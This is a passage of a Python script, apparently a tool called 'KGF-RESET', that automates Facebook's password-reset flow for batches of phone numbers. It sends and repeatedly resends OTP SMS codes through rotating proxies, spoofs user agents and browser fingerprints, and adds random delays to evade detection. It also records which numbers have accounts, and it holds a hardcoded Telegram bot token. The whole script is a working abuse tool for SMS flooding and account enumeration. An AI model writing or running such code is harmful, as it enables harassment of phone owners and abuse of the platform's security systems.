            resp = await session.post(f"https://{fb_domain}/api/graphql/", data=base_body, headers=hdrs, allow_redirects=False)
            data = parse_fb_json(resp.text)
            has_err = bool(data.get("errors"))
            
            if resp.status_code == 200 and not has_err:
                return {"ok": True, "status": resp.status_code, "body": json.dumps(data)[:120], "doc_id": doc_id}
            elif has_err:
                continue
            else:
                return {"ok": False, "status": resp.status_code, "body": json.dumps(data)[:120]}
        except Exception:
            pass
            
    return {"ok": False, "status": 0, "body": "All doc_ids failed."}

async def fb_send_otp(phone, proxy=None, ua=None, cpIndex=0, verbose=True, fb_domain="www.facebook.com", browserProfile="chrome", resendCount=1):
    user_agent = ua or rand_fb_ua()
    
    impersonate_profile = 'chrome124'
    if ("iPhone" in user_agent or "iPad" in user_agent) and "Version/" in user_agent:
        impersonate_profile = 'safari17_0'
    elif "Macintosh" in user_agent and "Version/" in user_agent:
        impersonate_profile = 'safari17_0'
    elif "Edg/" in user_agent:
        impersonate_profile = 'edge101'
    
    session_kwargs = {'impersonate': impersonate_profile, 'timeout': 25, 'max_redirects': 10}
    if proxy:
        session_kwargs['proxies'] = {'http': proxy["proxyUrl"], 'https': proxy["proxyUrl"]}
        
    last_error = "Unknown error"
    
    for attempt in range(3):
        try:
            async with AsyncSession(**session_kwargs) as session:
                domain = fb_domain
                if fb_domain == "random":
                    valid_domains = [d["value"] for d in FB_DOMAINS if d["value"] not in ["random", "all"]]
                    domain = random.choice(valid_domains)
                    
                page = await fb_get_page(session, phone, user_agent, domain)
                if not page["ok"]: 
                    last_error = f"Step1: {page['error']}"
                    continue
                
                lsd, params = page["lsd"], page["params"]
                
                waterfall_id = str(uuid.uuid4())
                params["flow_session_id"] = f"upl_wizard_{int(time.time()*1000)}_{uuid.uuid4()}"
                params["upl_session_id"] = f"upl_{int(time.time()*1000)}_{uuid.uuid4()}"
                
                sub = await fb_submit_phone(session, phone, waterfall_id, lsd, params, user_agent, domain)
                if sub.get("noAccount"): return {"ok": False, "status": 404, "detail": "No Account Found for this number"}
                if not sub.get("cipher"): 
                    last_error = f"Step1.5: {sub.get('error')}"
                    continue
                
                init = await fb_initiate_view(session, phone, sub["cipher"], lsd, params, user_agent, domain)
                if not init["ok"]: 
                    last_error = f"Step2: {init['error']}"
                    continue
                
                cp_opts = init.get("cpOpts", [])
                cpKey = cp_opts[cpIndex]["key"] if len(cp_opts) > cpIndex else f"send_sms:{cpIndex}"
                
                await asyncio.sleep(random.uniform(1.0, 2.5))
                await fb_support_chat(session, phone, init["cipher"], init["cuid"], lsd, params, user_agent, domain)
                await asyncio.sleep(random.uniform(1.5, 3.5))
                
                send = None
                for i in range(resendCount):
                    send = await fb_send_code(session, phone, waterfall_id, init["cipher"], init["cuid"], cpKey, lsd, params, user_agent, domain)
                    if i < resendCount - 1:
                        await asyncio.sleep(5 + random.uniform(2, 4))
                        
                if send and send.get("ok"):
                    return {"ok": send["ok"], "status": send["status"], "detail": send["body"]}
                else:
                    last_error = f"Step3: {send.get('body') if send else 'No response'}"
                    continue
                    
        except Exception as e:
            last_error = f"Exception: {str(e)}"
            await asyncio.sleep(2)
            
    return {"ok": False, "status": 0, "detail": last_error}

def get_phone_country_info(phone_str):
    cc = "US"
    c_name = "Unknown"
    try:
        pn = phonenumbers.parse("+" + phone_str.lstrip('+'))
        cc = phonenumbers.region_code_for_number(pn) or "US"
    except Exception:
        pass
    
    flag_emoji = "".join(chr(ord(c) + 127397) for c in cc.upper()) if cc else ""
    return flag_emoji, cc

def get_proxy_country_emoji(country_str):
    if not country_str or country_str == "RAW" or len(country_str) != 2: return ""
    return "".join(chr(ord(c) + 127397) for c in country_str.upper())

async def run_batch(numbers, proxies, threads, fb_domain, resend_count, skip_proxy_check=False):
    success_file = "success_numbers.txt"
    open(success_file, "w").close()
    
    live_proxies = proxies
    if proxies and not skip_proxy_check:
        live_proxies = await filter_live_proxies(proxies, 50)
        if not live_proxies:
            print(f"{C_RED} All proxies are DEAD! Aborting.{C_RESET}")
            return
            
    success, fail, dead_proxy, live_proxy = 0, 0, 0, 0
    done = 0
    total = len(numbers)
    remaining_numbers = numbers.copy()
    
    print()
    
    def update_progress():
        pct = (done / total * 100) if total else 0
        sys.stdout.write(f"\r  {C_CYAN}KGF-RESET  [{done}/{total}] {pct:.1f}%  OK: {success}  Err: {fail}{C_RESET}")
        sys.stdout.flush()
        
    update_progress()
    sem = asyncio.Semaphore(threads)
    
    async def worker(idx, raw_num):
        nonlocal done, success, fail, dead_proxy, live_proxy
        async with sem:
            proxy = live_proxies[idx % len(live_proxies)] if live_proxies else None
            num = raw_num.lstrip('+')
            ua = rand_fb_ua()
            
            run_domains = [fb_domain]
            if fb_domain == "random":
                valid_domains = [d["value"] for d in FB_DOMAINS if d["value"] not in ["random", "all"]]
                run_domains = [random.choice(valid_domains)]
            elif fb_domain == "all":
                run_domains = [d["value"] for d in FB_DOMAINS if d["value"] not in ["random", "all"]]
                
            results = []
            for i in range(0, len(run_domains), 3):
                chunk = run_domains[i:i+3]
                chunk_res = await asyncio.gather(*(fb_send_otp(num, proxy, ua, 0, False, d, 'ios', resend_count) for d in chunk))
                results.extend(chunk_res)
                if i + 3 < len(run_domains):
                    await asyncio.sleep(1)
                    
            success_res = next((r for r in results if r["ok"]), None)
            if success_res:
                ok, status, detail = True, success_res["status"], success_res["detail"]
            else:
                ok, status, detail = False, results[0]["status"], results[0]["detail"]
                
            res_msg = ""
            if ok:
                success += 1
                live_proxy += 1
                res_msg = f"{C_GREEN}OTP Sent{C_RESET}"
                with open(success_file, "a") as f: f.write(raw_num + "\n")
            else:
                fail += 1
                if status == 0: dead_proxy += 1
                else: live_proxy += 1
                if status == 404 or (detail and "no account" in detail.lower()):
                    res_msg = f"{C_YELLOW}No Account{C_RESET}"
                else:
                    res_msg = f"{C_RED}Failed/Drop: {str(detail)[:30]}{C_RESET}"
                    
            flag_emoji, c_name = get_phone_country_info(num)
            p_country = proxy["country"] if proxy else "RAW"
            p_emoji = get_proxy_country_emoji(p_country)
            p_label = f"{p_emoji}{p_country}" if proxy else "NoProxy"
            
            ua_type = "Windows Chrome"
            if "iPhone" in ua: ua_type = "iPhone Safari"
            elif "iPad" in ua: ua_type = "iPad Safari"
            elif "Macintosh" in ua and "Version/" in ua: ua_type = "Mac Safari"
            elif "Macintosh" in ua: ua_type = "Mac Chrome"
            elif "Linux" in ua: ua_type = "Linux Chrome"
            elif "Edg/" in ua: ua_type = "Windows Edge"
            elif "Firefox/" in ua: ua_type = "Windows Firefox"
            
            log_str = f"{C_WHITE}KGF-RESET  {res_msg.ljust(20)}  {num} [{flag_emoji}{c_name}  Proxy:{p_label}  {ua_type}]{C_RESET}"
            
            print(f"\r\x1b[K{log_str}")
            done += 1
            update_progress()
            
            if raw_num in remaining_numbers:
                remaining_numbers.remove(raw_num)
                with open(NUMBERS_FILE, "w") as f:
                    f.write("\n".join(remaining_numbers) + ("\n" if remaining_numbers else ""))
                    
            await asyncio.sleep(2.5)
            
    tasks = [asyncio.create_task(worker(i, n)) for i, n in enumerate(numbers)]
    await asyncio.gather(*tasks)
    print("\n")
    print(f"\n{C_GREEN} Summary: Total:{total} | Success:{success} | Failed:{fail}{C_RESET}")
    print(f"{C_YELLOW} Proxies: Total:{len(live_proxies)} (checked) | Live:{live_proxy} | Dead:{dead_proxy}{C_RESET}")
    
    if success > 0:
        reuse = input("Do you want to reuse the successful numbers? (y/N): ")
        if reuse.lower() == 'y':
            try:
                with open(success_file, "r") as f: content = f.read().strip()
                if content:
                    with open(NUMBERS_FILE, "a") as f: f.write("\n" + content + "\n")
                    print(f"\n{C_GREEN} [*] Successful numbers added back to {NUMBERS_FILE}!{C_RESET}")
            except Exception as e:
                print(f"\n{C_RED} Failed to restore numbers: {str(e)}{C_RESET}")

async def send_telegram_notification(text):
    if TELEGRAM_BOT_TOKEN == "8957309929:AAGrasH2c8ZKUxFDbuqUPbqWASsT6ebB0qA" or not TELEGRAM_BOT_TOKEN: return
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={
            "chat_id": TELEGRAM_ADMIN_CHAT_ID,
            "text": text,
            "parse_mode": "Markdown"
        })
    except Exception:
        pass

async def main():
    open_telegram_channel()
    while True:
        banner()
        print("Select an Option:")
        print("  [1] FB - Batch from numbers.txt")
        print("  [2] View Config Files")
        print("  [3] Proxy Health Check")
        print("  [4] Exit")
        
        choice = input(f"\n{C_YELLOW}Select > {C_RESET}").strip()
        
        if choice == "1":
            numbers = load_lines(NUMBERS_FILE)
            if not numbers:
                print(f"{C_RED} numbers.txt is empty!{C_RESET}")
            else:
                print(f"\nSelect FB Domain:")
                for i, d in enumerate(FB_DOMAINS):
                    print(f"  [{i+1}] {d['name']}")
                d_idx = int(input(f"\n{C_YELLOW}Select > {C_RESET}") or "1") - 1
                fb_domain = FB_DOMAINS[d_idx]["value"] if 0 <= d_idx < len(FB_DOMAINS) else "www.facebook.com"
                
                threads = int(input("\nThreads (Default=1): ") or "1")
                resend = int(input("OTP Send Count per number (Default=1): ") or "1")
                
                await run_batch(numbers, load_proxies(), threads, fb_domain, resend)
            input("\nPress Enter to return...")
            
        elif choice == "2":
            banner()
            for fn in [NUMBERS_FILE, PROXY_FILE]:
                print(f"{C_WHITE}--- {fn} ---{C_RESET}")
                if os.path.exists(fn):
                    with open(fn, "r") as f: print(f.read().strip())
                else:
                    print(f"{C_RED}File missing{C_RESET}")
                print()
            input("Press Enter to return...")
            
        elif choice == "3":
            proxies = load_proxies()
            if not proxies:
                print(f"{C_RED} proxy.txt is empty!{C_RESET}")
            else:
                await filter_live_proxies(proxies, 200)
            input("\nPress Enter to return...")
            
        elif choice == "4":
            print(f"\n{C_GREEN} Exiting...{C_RESET}")
            sys.exit(0)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{C_RED}Exiting...{C_RESET}")
        sys.exit(0)
